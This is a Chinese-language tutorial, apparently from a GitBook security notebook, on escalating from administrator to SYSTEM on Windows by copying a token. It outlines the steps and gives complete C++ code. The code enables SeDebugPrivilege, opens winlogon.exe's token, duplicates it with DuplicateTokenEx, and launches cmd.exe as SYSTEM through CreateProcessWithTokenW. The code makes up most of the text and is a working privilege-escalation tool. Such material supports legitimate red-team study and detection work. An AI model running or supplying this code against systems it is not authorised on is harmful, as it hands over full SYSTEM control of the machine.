# 通过复制Token提权到SYSTEM

在windows系统中使用一个较高细粒度的Token来区分和管理权限，我们通常说的system权限administrator权限本质上是令牌的完整性和特权不同，通过细粒度较高的特权进行区分。

在本文中，不会对令牌机制进行详细的剖析，只需要知道它本质上是一个内核对象即可，详细的内容会在以后的内核操作文章中详细讲解。

* 下图分别是medium完整性令牌和high完整性令牌。

![](../.gitbook/assets/image%20%2810%29.png)

![](../.gitbook/assets/image%20%2835%29.png)

## 提权流程

1. 打开system权限进程
2. 复制system权限进程Token
3. 使用复制Token打开新进程

## 代码实现

默认配置的管理员拥有SeDebugPrivilege，该权限用于调试进程，是否拥有直接决定你是否能打开写入调试注入如winlogon,system等进程。

```text
#include <windows.h>
#include <iostream>
#include <Lmcons.h>
#include <TlHelp32.h>

BOOL SePrivTokenrivilege(
	HANDLE hToken,          
	LPCTSTR lpszPrivilege, 
	BOOL bEnablePrivilege  
)
{
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL,            
		lpszPrivilege,  
		&luid))       
	{
		return FALSE;
	}

	TOKEN_PRIVILEGES PrivToken;
	PrivToken.PrivilegeCount = 1;
	PrivToken.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		PrivToken.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		PrivToken.Privileges[0].Attributes = 0;


	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&PrivToken,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		return FALSE;
	}

	return TRUE;
}


DWORD FindProcessPID(const wchar_t* ProcessName) {
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 process = { 0 };
	process.dwSize = sizeof(process);

	if (Process32First(snapshot, &process)) {
		do {
			if (!wcscmp((const wchar_t*)process.szExeFile,(const wchar_t*)ProcessName))
				break;
		} while (Process32Next(snapshot, &process));
	}

	CloseHandle(snapshot);
	return process.th32ProcessID;
}

int main(int argc, char** argv) {
	HANDLE hDpToken = NULL;
	
	

	HANDLE hCurrentToken = NULL;
	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hCurrentToken);
	SePrivTokenrivilege(hCurrentToken, L"SeDebugPrivilege", TRUE);

	DWORD PID_TO_IMPERSONATE = FindProcessPID(L"Winlogon.exe");
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, true, PID_TO_IMPERSONATE);


	HANDLE hToken = NULL;
	BOOL TokenRet = OpenProcessToken(hProcess,
		TOKEN_DUPLICATE |
		TOKEN_ASSIGN_PRIMARY |
		TOKEN_QUERY, &hToken);

	BOOL impersonateUser = ImpersonateLoggedOnUser(hToken);
	if (GetLastError() == NULL)
	{
		RevertToSelf();
	}

	
	BOOL dpToken = DuplicateTokenEx(hToken, 
		TOKEN_ADJUST_DEFAULT |
		TOKEN_ADJUST_SESSIONID |
		TOKEN_QUERY |
		TOKEN_DUPLICATE |
		TOKEN_ASSIGN_PRIMARY,
		NULL,
		SecurityImpersonation,
		TokenPrimary,
		&hDpToken
	);


	STARTUPINFO startupInfo = {0};
	startupInfo.cb = sizeof(STARTUPINFO);
	PROCESS_INFORMATION ProcessInfo = {0};

	BOOL Ret = CreateProcessWithTokenW(hDpToken,
		LOGON_WITH_PROFILE,
		L"C:\\Windows\\System32\\cmd.exe",
		NULL, 0, NULL, NULL,
		&startupInfo,
		&ProcessInfo);


	return TRUE;
}
```

## LINKS

{% embed url="https://docs.microsoft.com/zh-cn/azure/active-directory/develop/access-tokens" %}



